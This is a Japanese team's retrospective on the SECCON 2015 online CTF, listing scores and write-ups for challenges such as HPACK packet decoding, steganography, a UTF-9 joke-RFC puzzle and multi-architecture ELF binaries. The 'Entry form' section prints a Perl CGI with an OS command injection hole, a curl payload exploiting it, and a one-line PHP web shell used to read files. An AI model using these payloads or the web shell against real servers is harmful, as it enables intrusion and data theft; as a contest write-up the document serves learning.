# レトロスペクティブ資料

## チーム

ping

## 成績

- 得点 2000 点
- 順位 74位(69位タイ)

※2015/12/6時点

## 問題と解説者

|結果|Title|Genre|Points|Solves|解説者|
|----|-----|-----|------|------|------|
|★|Start SECCON CTF|Exercises|50|839|tsb|
|★|SECCON WARS 2015|Stegano|100|312|tsb|
|★|Unzip the file|Crypto|100|196|tsb|
|★|Reverse-Engineering Android APK 1|Binary|100|287||
|★|Fragment2|Web/Network|200|60|xmisao|
||Reverse-Engineering Hardware 1|Binary|400|20||
|★|Connect the server|Web/Network|100|587|oppai|
|★|Command-Line Quiz|Unknown|100|396|tsb|
|★|Entry form|Web/Network|100|189|oppai|
||Bonsai XSS Revolutions|Web/Network|200|49||
|★|Exec dmesg|Binary|300|175|kubo39|
|★|Decrypt it|Crypto|300|199|tsb|
||QR puzzle (Web)|Unknown|400|31||
||QR puzzle (Nonogram)|Unknown|300|51||
||QR puzzle (Windows)|Unknown|200|138|tsb|
||Reverse-Engineering Android APK 2|Unknown|400|11||
|★|Find the prime numbers|Crypto|200|54|tsb|
||Micro computer exploit code challenge|Exploit|300|15||
||GDB Remote Debugging|Binary|200|60||
||FSB: TreeWalker|Exploit|200|51||
|★|Steganography 1|Stegano|100|304|oppai|
||Steganography 2|Stegano|100|18||
|★|Steganography 3|Stegano|100|172|xmisao|
|★|4042|Unknown|100|63|xmisao|
||Individual Elebin|Binary|200|18|kubo39|
||SYSCALL: Impossible|Exploit|500|16||
||Please give me MD5 collision files|Crypto|400|5||
||Reverse-Engineering Hardware 2|Binary|500|10||
|★|Last Challenge (Thank you for playing)|Exercises|50|545|tsb|

## Start SECCON CTF

## SECCON WARS 2015

## Unzip the file

## Reverse-Engineering Android APK 1

## Fragment2

### 問題

https://github.com/SECCON/SECCON2015_online_CTF/tree/master/Web_Network/200_Fragment2

> Decode me
> fragment2.pcap

### 概要

PCAPファイルをデコードしてフラグを取り出す問題。
PCAPファイルには正体不明の1パケットだけが含まれている。
パケットのsrcポートが80であることから、HTTP通信の断片だと推測できる。
このパケットはHTTP/2通信のパケットで、ヘッダがHPACK(RFC 7541)という方法で圧縮されている。
HPACKの仕様に従ってヘッダをデコードすると、フラグ`SECCON{H++p2i5sOc0o|}`が得られる。

* https://tools.ietf.org/html/rfc7541
* http://syucream.github.io/hpack-spec-ja/rfc7541-ja.html (和訳)

### 解答のポイント

最新のRFCに対する知識もしくは気付きが重要。
またツールが最新のRFCをサポートしているわけではないことを踏まえてアプローチしないといけない。

古いWireshark(1.12.1)では、PCAPファイルをHTTP/2として正常にデコードできなかった。
PCAPファイルをHTTP/2のヘッダとデータに分離するのに、新しいWireshark(2.0.0)を使用する必要があった。
それでも、ヘッダ内のHPACK圧縮された内容はデコードできなかった。
HPACK圧縮された内容は手作業で解析する必要があった。

HPACK圧縮には一意のハフマン符号を使うことがRFCに書かれている。
ハフマン符号はRFCの付録Bで定義されている。

http://tools.ietf.org/html/draft-ietf-httpbis-header-compression-10#appendix-B

HPACK圧縮されたヘッダをビット列に変換すると以下になる。

~~~~
10001000110000111100001001000000100001011111001010110100101101000000111001101111100101001101110110000010111101011110110101011010011111111111111101100011111111110111111111101110101100010001100110110100011010100010000000001111111111110011111111111101000011110000110100000010001100010011011111000001110000001011111101000000100010011111001010110100111010010100110101100010010110101011101101010001001111110000000100110001
~~~~

ヘッダ全体を解析するには手間がかかるので、フラグにあたりをつけて読み解いた。
ハフマン符号はわかっており、フラグは`SECCON{XXX}`の形だと推測されるので、まず`N{`と`}`がビット列に無いかを探した。
幸い、`N{`と`}`のビット列が見つかったので、あとはその中身のハフマン符号を地道に読み解くことで解答できた。

~~~~
1101010 => O
1101001 => N
111111111111110 => {
1100011 => H
11111111011 => +
11111111011 => +
101011 => p
00010 => 2
00110 => i
011011 => 5
01000 => s
1101010 => O
00100 => c
00000 => 0
00111 => o
11111111 100 => |
11111111111101 => }
~~~~

### 使用ツール

* Wireshark 2.0.0
* Ruby
  * hex2bin.rb -- スペース区切りの16進数文字列をビット列の文字列にするスクリプト

~~~~sh
ruby hex2bin.rb haffman.txt
~~~~

## Reverse-Engineering Hardware 1

## Connect the server

### 問題

```
login.pwn.seccon.jp:10000
```

### 概要

とりあえずncで接続してみると、コンソールが表示されて `login:` というのが出てきた。
何度か適当に入力を試してると `HINT: It is already in your hands.` という文字列が出てきた。

試しにGoogleChromeでアクセスするとファイルがダウンロード出来て、`SECCON{Sometimes_what_you_see_is_NOT_what_you_get}` が手に入った。

### 使用ツール
- GoogleChrome
- vim

## Command-Line Quiz

## Entry form

### 問題

```
http://entryform.pwn.seccon.jp/register.cgi

( Do not use your real mail address.)
(登録情報に他人に知られたくないメールアドレスは使用しないでください)
```

### 概要

まず、http://entryform.pwn.seccon.jp/にアクセスするとファイル一覧が有効になっていた。

http://entryform.pwn.seccon.jp/register.cgi_bakというファイルがあるのでアクセスすると
register.cgiの中身っぽい。

```perl
#!/usr/bin/perl
# by KeigoYAMAZAKI, 2015.11.02-

use CGI;
my $q = new CGI;

print<<'EOM';
Content-Type: text/html; charset=utf-8

<html>
<head>
  <meta charset="utf-8">
  <title>SECCON 2015</title>
</head>
<body style='background:#000;color:#52d6eb;font-family:"ヒラギノ明朝 ProN W6", "HiraMinProN-W6", "HG明朝E", "ＭＳ Ｐ明朝", "MS PMincho", "MS 明朝", serif'>
<img src="logo.png">
<h2 style="text-align:center">SECURITY CONTEST 2015</h2>
<h1 style="font-size:28px;border-top:1px solid #28363D;border-bottom:1px solid #28363D;padding:15px">Entry Form</h1>
<form action="?" method="get"><pre>
EOM

if($q->param("mail") ne '' && $q->param("name") ne '') {
  open(SH, "|/usr/sbin/sendmail -bm '".$q->param("mail")."'");
  print SH "From: keigo.yamazaki\@seccon.jp\nTo: ".$q->param("mail")."\nSubject: from SECCON Entry Form\n\nWe received your entry.\n";
  close(SH);

  open(LOG, ">>log"); ### <-- FLAG HERE ###
  flock(LOG, 2);
  seek(LOG, 0, 2);
  print LOG "".$q->param("mail")."\t".$q->param("name")."\n";
  close(LOG);

  print "<h1>Your entry was sent. <a href='?' style='color:#52d6eb'>Go Back</a></h1>";
  exit;
}

print <<'EOM';
</pre><table border="0" style="margin:30px">
<tr><td>Your E-Mail address:</td><td><input type="email" name="mail" size="30" required></td></tr>
<tr><td>Your Name:</td><td><input type="text" name="name" size="30" required></td></tr>
<tr><td colspan="2"><input type="submit" name="action" value="Send" style="background-color:#52d6eb;border-style:none;padding:5px;margin:10px"></td></tr>
</table>
</form>
</body>
</html>
EOM

1;
```

`http://host/log` というログが書かれているファイルをどうにか読めば良さそう。
初めはmailsendを使ってるので、メールヘッダインジェクションかなって思ったけど、普通にopenコマンドの所にOSコマンドインジェクションがある。

`curl -i -X GET "http://entryform.pwn.seccon.jp/register.cgi?mail='%20|ls%20-l'&name=hoge&action=Send"` こんな感じで叩いてやると、HTMLの中にls結果が紛れてくる。

```
<form action="?" method="get"><pre>
total 772
dr-xr-xr-x 2 root   root   4096 Dec  1 21:52 SECRETS
-r---w---- 1 apache cgi  769650 Dec  5 18:16 log
-r--r--r-- 1 root   root   1132 May 15  2015 logo.png
-r-xr-xr-x 1 cgi    cgi    1583 Dec  1 22:02 register.cgi
-r--r--r-- 1 root   root   1583 Dec  1 22:25 register.cgi_bak
<h1>Your entry was sent. <a href='?' style='color:#52d6eb'>Go Back</a></h1>%
```

`SECRET` ディレクトリの中に`backdoor123.php`というのがあって、catで表示させてみると。

```
<pre><?php system($_GET['cmd']); ?></pre>
```

`backdoor123.php` はrootで実行されてるため、logの中身を見れるよう。(いたずらも出来そう)

`curl -i -X GET "http://entryform.pwn.seccon.jp/SECRET/backdoor123.php?cmd=head%20../log"`

`SECCON{Glory_will_shine_on_you.}`

### 使ったツール
- curl

## Bonsai XSS Revolutions

## Exec dmesg

https://github.com/SECCON/SECCON2015_online_CTF/tree/master/Binary/300_Exec%20dmesg

### 問題

>Please find secret message from the iso linux image.
>image.zip
>秘密のメッセージをLinuxのisoイメージの中から見つけてください。
>image.zip

### 概要

zipファイルを解凍するとisoファイルがある。

```
$ file core-current.iso
core-current.iso: # ISO 9660 CD-ROM filesystem data 'TC-Core' (bootable)
```

qemuで起動するとx86_64なtiny kernelが立ち上がる。

```
$ qemu-system-x86_64 -cdrom core-current.iso
```

イメージを起動するとプロンプトが表示され、ホームディレクトリには意味のあるものがなさそうだったので、表題にある `dmesg` を実行してみる。

```
$ dmesg
dmsg: applet not found
$which dmesg
/bin/dmesg
$ls -ll /bin/dmesg
/bin/dmesg -> busybox
```

`dmesg` コマンドは `busybox` を指すようになっているが、`busybox` 側には `dmesg` は入っていなかった。

ちなみに `busybox` は便利コマンドを単一のバイナリにまとめたユーティリティで、組み込み用途などで使われる。

`dmesg` で表示されるのと同じ内容が `/dev/kmsg` にあるので、そこをみる。

`cat /dev/kmsg | grep SECCON` でフラグを見つけた。

### 解答のポイント

`dmesg` が `exec >/dev/kmsg 2&>1` であることを知ってるかの知識問題。

### ツール

* qemu(一式あるとよい)
* file

## Decrypt it

## QR puzzle (Web)

## QR puzzle (Nonogram)

## QR puzzle (Windows)

## Reverse-Engineering Android APK 2

## Find the prime numbers

## Micro computer exploit code challenge

## GDB Remote Debugging

## FSB: TreeWalker

## Steganography 1

```
Find image files in the file
MrFusion.gpjb
Please input flag like this format-->SECCON{*** ** **** ****}
```

### 概要

1枚の[画像](https://github.com/SECCON/SECCON2015_online_CTF/blob/master/Stegano/100_Steganography%201/MrFusion.gpjb?raw=true)の中に複数の画像形式が含まれている奴です 分解するとバックトゥーザフューチャーのあれだった。分解方法としてはバイナリエディタ(vim)で目grepでした。
`OCT 21 2015 07 28`と言うのはわかったけど、それを`{}`で囲っても駄目だった。
ヒントが出てから, `SECCON{*** ** **** ****}` と知る。

`SECCON{OCT 21 2015 0728}`

### 使ったツール
- vim

## Steganography 2

## Steganography 3

### 問題

https://github.com/SECCON/SECCON2015_online_CTF/tree/master/Stegano/100_Steganography%203

>We can get desktop capture!
>Read the secret message.
>desktop_capture.png
>
>デスクトップのキャプチャに成功した！
>秘密のメッセージを読み取ってほしい
>desktop_capture.png

### 概要

デスクトップをキャプチャしたpngファイルが与えられる。
pngファイルにはバイナリが書かれている。
バイナリはELFヘッダの`ELF`という文字があるため、Linux等で実行可能とわかる。
バイナリを打ち込んで、Linuxで実行すると`Rmxvb2QgZmlsbA0K`という文字列が出力される。
この文字列は`Flood fill`をBASE64エンコードしたもの。
pngファイルのバイナリエディタ部分を塗りつぶすと、フラグ`SECCON{the_hidden_message_ever}`が浮かび上がる。

### 画像

塗りつぶし前

https://github.com/SECCON/SECCON2015_online_CTF/blob/master/Stegano/100_Steganography%203/desktop_capture.png

塗りつぶし後

https://seccon2015ping.slack.com/files/yuutaro35/F0G0AKX8B/desktop_capture.png

### 解答のポイント

問題が画像だというのがポイント。
当日はみんなでバイナリを分担して打ち込み、それを結合して実行した。
勘の良い人なら、バイナリを実行せずとも、画像を塗りつぶすことを思いつくかも知れない。

バイナリは528バイトあり、入力の手間がかかる。
実はBASE64エンコードした文字列は`00003C`から`00004B`に現れている。
この部分がBASE64だと気づけば、バイナリをすべて打ち込んで実行することなく、`Flood fill`という文字列が得られる。

早期の回答のためには、問題の傾向の理解と、エンコードされた文字列を目grepする力が必要。

### 使用ツール

* Oktate(例年使用しているKDEのバイナリエディタ)
* `cat`
* `base64`
* `hexdump`

`cat`による結合。

~~~~sh
cat 000_0FF.bin 100.bin 200new2.bin 0300_033F.bin > executable3
~~~~

`base64`によるBASE64文字列のデコード。

~~~~sh
echo 'Rmxvb2QgZmlsbA0K'|base64 -d
~~~~

`hexdump`で結合したバイナリファイルの内容を確認。

~~~~sh
hexdump executable3
~~~~

## 4042

### 問題

https://github.com/SECCON/SECCON2015_online_CTF/tree/master/Unknown/100_4042

>Unknown document is found in ancient ruins, in 2005.
>Could you figure out what is written in the document?
>no-network.txt
>
>謎の文章が2005年に古代遺跡から発見された。
>これは何を意味している？
>no-network.txt

no-network.txt

https://github.com/SECCON/SECCON2015_online_CTF/blob/master/Unknown/100_4042/no-network.txt

### 概要

問題タイトルと問題文をヒントに、テキストファイルを読み解く問題。
テキストファイルは`0`から`7`までの文字だけで構成されていることから、8進数文字列だとわかる。

タイトルの"4042"と"2005年に古代遺跡から発見された"がヒントで、これは2005年4月1日に発表されたジョークRFC、RFC 4042のこと。
RFC 4042はUTF-9およびUTF-18というUnicode符号化方式について。

* https://www.ietf.org/rfc/rfc4042.txt
* http://www.kt.rim.or.jp/~ksk/joke-RFC/rfc4042j.txt (和訳)

テキストファイルを8進数文字列として読み、UTF-9で符号化されているものと解釈すると、Unicodeのコードポイントが得られる。
Unicodeのコードポイントを、何らかの方法で符号化して文字列化する。
この文字列にフラグ`SECCON{A_GROUP_OF_NINE_BITS_IS_CALLED_NONET}`がマルチバイト文字で書かれている。

### 解答のポイント

ヒントからRFCにたどり着くこと。
これは`4042 2005`とぐぐればわかるので、SECCONで出てきた謎の文字列はとりあえずぐぐると良い。

あとはUTF-9の仕様理解がポイント。
UTF-9は9ビット単位(ノネット)のUnicodeの符号化方式で、ノネットの先頭1ビット(以下、継続ビット)で継続を表し、残り8ビット(以下、コードポイント部)にUnicodeのコードポイントを格納する。

継続ビットが`1`の場合、そのノネットのコードポイント部は、次のノネットのコードポイント部と結合することを示す。
継続ビットが`0`の場合、そのノネットのコードポイント部で、Unicodeのコードポイントが終わりであることを示す。
コードポイントが`U+0000`〜`U+00FF`までの文字は、継続ビットが`0`の1ノネット単独で表現される。

ノネットは9ビット単位なので、8進数文字列では3文字が、1ノネットとなる。
あとはノネット単位で、継続ビットを見ながらUnicodeコードポイントを取り出せば良い。
Unicodeコードポイントは、32bit幅でバイナリ化すると、そのままUTF-32文字列に符号化できる。

当初、国際的な大会だしASCII文字列だろうと思い込んでいたので、だいぶ時間を無駄にしてしまった。
Unicodeの符号化方式なのだから、非ASCIIのUnicode文字なことを想定しておくべきだった。

### 使用ツール

* Ruby
  * `oct2nonet.rb` -- 8進数文字列を3文字ずつ切り出して1行1ノネットにするスクリプト
  * `nonet2unicode.rb` -- 1行1ノネットのテキストファイルを読み込んでUTF-32文字列を出力するスクリプト
* GVim -- XTermでは表示できなかった…

~~~~sh
ruby oct2nonet.rb no-network.txt > nonet.txt
ruby nonet2unicode.rb nonet.txt > utf32.txt
gvim utf32.txt
~~~~

スクリプトと結果は`4042`ディレクトリ以下にpush済み。

## Individual Elebin

### 問題

https://github.com/SECCON/SECCON2015_online_CTF/tree/master/Binary/200_Individual%20Elebin

>Execute all ELF files
>Individual_Elebin.zip
>すべてのELFファイルを実行せよ
>Individual_Elebin.zip

### 概要

全ての実行形式ファイルを実行して出力された結果をつなげるだけの問題、だけども多種多様なアーキテクチャのバイナリが容易されている。

```
$ file *.bin
1.bin:  ELF 32-bit LSB  executable, Intel 80386, version 1 (FreeBSD), statically linked, stripped
10.bin: ELF 32-bit LSB  executable, ARM, version 1, statically linked, stripped
11.bin: ELF 32-bit MSB  executable, MIPS, MIPS-I version 1 (SYSV), statically linked, stripped
2.bin:  ELF 32-bit MSB  executable, MC68HC11, version 1 (SYSV), statically linked, stripped
3.bin:  ELF 32-bit LSB  executable, NEC v850, version 1 (SYSV), statically linked, stripped
4.bin:  ELF 32-bit MSB  executable, Renesas M32R, version 1 (SYSV), statically linked, stripped
5.bin:  ELF 64-bit MSB  executable, Renesas SH, version 1 (SYSV), statically linked, stripped
6.bin:  ELF 32-bit MSB  executable, SPARC version 1 (SYSV), statically linked, stripped
7.bin:  ELF 32-bit LSB  executable, Motorola RCE, version 1 (SYSV), statically linked, stripped
8.bin:  ELF 32-bit LSB  executable, Axis cris, version 1 (SYSV), statically linked, stripped
9.bin:  ELF 32-bit LSB  executable, Atmel AVR 8-bit, version 1 (SYSV), statically linked, stripped
```

形式が `SECCON{...}` なので、 1.binと11.binは `strings` でそれぞれ `SECCON{AaA` と `eAaAq}` であることがわかった。

他のバイナリに関して、最初はqemuのエミュレート機能を使ってみたけどうまく実行されないようだったので、gdbをソースからビルドしたときに生成されるエミュレート機能を利用することにした。

一例を以下にあげる。

```
$ ./configure --target=m6811-elf --prefix="$HOME/opt/cross"
```

```
( ՞ਊ ՞) :~/dev/ctf/elebin/Individual_Elebin $ $HOME/opt/cross/bin/m6811-elf-run 2.bin
B( ՞ਊ ՞) :~/dev/ctf/elebin/Individual_Elebin $
```

というかんじでやっていたんだけれど、`5.bin` と `7.bin` がなかなか解けず。

5.binは終了直前に64bitなのに気づいて(遅い) targetを `sh64` にして解けたけど `7.bin` は最後まで解けず。。

後で他チームの解答みると最初に指定した `target=mcore` でよくて、gdb側のconfigureをいじらなくてはいけなかったらしい。

### 解答のポイント

解けてないですが、後一歩だった問題です。
結構gdb知識問われる問題だし辛いのでは。。200の割に解けてる人少ないし。いや、普通にgdbで実行してもできるっちゃできるしそうでもないのか。。？
あとアーキテクチャの知識がなくて辛かったので、そのへんも必要なんですかね、 `Motorola RCE` と `mcore` の対応関係が最後まで確信もてなくて `ppc` とかでビルドして試したりした時間が無駄だった。。

64bitは、まあちゃんとarchみましょうねという話なのでダメダメだった。つらい。

### ツール(一応？)

* gdb
* file

## SYSCALL: Impossible

## Please give me MD5 collision files

## Reverse-Engineering Hardware 2

## Last Challenge (Thank you for playing)

## 所感

### xmisao

主にコミットした問題はSteganography 3, 4042, Fragment2の3問(解答順)。
得点こそ合計400点と低いものの、Solvesがそれぞれ172, 63, 60と比較的少ないため、ある程度チームの得点の底上げができた。

エンジンがかかったのが翌日に入ってからだったのは非常に申し訳ない…。
人数も6人と多く、ガンガン解いてくれていたので、あまり得点は考えず、解けていない問題に集中して取り組めたのは良かった。

RFCはしばらく読みたくない。
特に4042では、ジョークRFCをほぼ完全に理解してしまい、精神的ダメージを負った。
あとハフマン符号を手作業で読み解くのはもう嫌だ。

### kubo39

コミットした問題はExec dmesgの1問。得点でいうと300点ですね。低い。。

問題選択とかなんか好き勝手させてもらって申し訳なかったです、なんか意地になってた。。Individual Elebin時間かかるなら他の問題解くほうがよかったのでは？？
